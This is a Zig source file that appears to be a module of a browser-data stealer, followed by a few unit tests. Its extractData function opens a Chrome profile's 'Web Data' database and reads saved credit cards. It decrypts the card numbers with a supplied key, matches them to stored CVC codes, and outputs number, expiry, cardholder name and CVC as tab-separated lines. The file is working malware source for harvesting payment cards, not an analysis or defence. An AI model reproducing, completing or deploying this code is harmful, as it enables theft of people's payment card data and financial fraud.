const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");

fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
    const cols = db.getColumnNames(table) catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, name)) return i;
    }
    return null;
}

fn valueToString(val: sqLoot.Value, allocator: std.mem.Allocator) ?[]const u8 {
    return switch (val) {
        .null => null,
        .int => |v| std.fmt.allocPrint(allocator, "{d}", .{v}) catch null,
        .text => |v| allocator.dupe(u8, v) catch null,
        .float => |v| std.fmt.allocPrint(allocator, "{d}", .{v}) catch null,
        .blob => null,
    };
}

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: [32]u8) ?[][]const u8 {
    const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" }) catch return null;
    defer allocator.free(db_path);

    const mapped = file_io.MappedFile.open(db_path) orelse return null;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return null;
    defer db.deinit();

    const card_rows = db.readTable("credit_cards") catch return null;
    defer allocator.free(card_rows);

    const name_idx = columnIndex(&db, "credit_cards", "name_on_card", allocator) orelse return null;
    const month_idx = columnIndex(&db, "credit_cards", "expiration_month", allocator) orelse return null;
    const year_idx = columnIndex(&db, "credit_cards", "expiration_year", allocator) orelse return null;
    const number_idx = columnIndex(&db, "credit_cards", "card_number_encrypted", allocator) orelse return null;
    const guid_idx = columnIndex(&db, "credit_cards", "guid", allocator);

    // Build CVC map
    var cvc_map = std.StringHashMap([]const u8).init(allocator);
    defer {
        var it = cvc_map.iterator();
        while (it.next()) |entry| {
            allocator.free(entry.key_ptr.*);
        }
        cvc_map.deinit();
    }
    if (db.readTable("local_stored_cvc") catch null) |cvc_rows| {
        defer allocator.free(cvc_rows);
        const cvc_guid_idx = columnIndex(&db, "local_stored_cvc", "guid", allocator);
        const cvc_val_idx = columnIndex(&db, "local_stored_cvc", "value", allocator);
        if (cvc_guid_idx) |cg_idx| {
            if (cvc_val_idx) |cv_idx| {
                for (cvc_rows) |cvc_row| {
                    if (cvc_row.len <= @max(cg_idx, cv_idx)) continue;
                    const guid = if (cvc_row[cg_idx] != .null) cvc_row[cg_idx].text else continue;
                    const val = if (cvc_row[cv_idx] != .null) cvc_row[cv_idx].text else "";
                    const guid_copy = allocator.dupe(u8, guid) catch continue;
                    cvc_map.put(guid_copy, val) catch allocator.free(guid_copy);
                }
            }
        }
    }

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (card_rows) |row| {
        if (row.len <= @max(name_idx, month_idx, year_idx, number_idx)) continue;

        const name_on_card = if (row[name_idx] != .null) row[name_idx].text else "";
        const month_str = if (row.len > month_idx) valueToString(row[month_idx], allocator) orelse continue else continue;
        defer allocator.free(month_str);
        const year_str = if (row.len > year_idx) valueToString(row[year_idx], allocator) orelse continue else continue;
        defer allocator.free(year_str);
        const enc_number = if (row[number_idx] != .null and row[number_idx] == .blob) row[number_idx].blob else continue;

        const guid = if (guid_idx) |gi| blk: {
            break :blk if (row.len > gi and row[gi] != .null) row[gi].text else "";
        } else "";

        const decrypted_result = chrome_crypto.decryptPassword(enc_number, key) orelse continue;
        const card_number = allocator.dupe(u8, decrypted_result) catch continue;
        defer allocator.free(card_number);

        const cvc = if (guid.len > 0 and cvc_map.get(guid)) |c| c else "";

        const line = std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}\t{s}\t{s}\n", .{
            card_number, month_str, year_str, name_on_card, cvc,
        }) catch continue;
        list.append(line) catch continue;
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator, [_]u8{0} ** 32);
    try std.testing.expect(result == null);
}

test "valueToString int" {
    const val = sqLoot.Value{ .int = 42 };
    const s = valueToString(val, std.testing.allocator) orelse return error.TestFailed;
    defer std.testing.allocator.free(s);
    try std.testing.expectEqualStrings("42", s);
}

test "valueToString text" {
    const val = sqLoot.Value{ .text = "hello" };
    const s = valueToString(val, std.testing.allocator) orelse return error.TestFailed;
    defer std.testing.allocator.free(s);
    try std.testing.expectEqualStrings("hello", s);
}

test "valueToString null" {
    const val = sqLoot.Value{ .null = {} };
    try std.testing.expect(valueToString(val, std.testing.allocator) == null);
}
